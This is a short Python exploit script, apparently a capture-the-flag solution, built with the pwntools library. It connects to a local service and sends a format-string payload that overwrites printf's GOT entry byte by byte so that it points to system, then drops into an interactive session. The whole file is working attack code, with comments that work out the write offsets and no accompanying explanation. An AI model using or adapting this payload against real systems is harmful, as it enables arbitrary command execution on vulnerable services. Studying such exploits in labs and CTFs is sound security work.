#!/usr/bin/env python
from pwn import *

r = remote('127.0.0.1', 4000)

printf_got = 0x804a010
fmt = ''

fmt += p32(printf_got)
fmt += p32(printf_got+1)
fmt += p32(printf_got+2)
fmt += p32(printf_got+3)

# system_plt = 0x08048440
fmt += '%48c%7$hhn'  # 0x40 - 16 = 48
fmt += '%68c%8$hhn'  # 0x84 - 0x40 = 68
fmt += '%128c%9$hhn' # 0x04 - 0x84 + 256 = 128
fmt += '%4c%10$hhn'  # 0x08 - 0x04 = 4

r.sendline(fmt)

r.interactive()
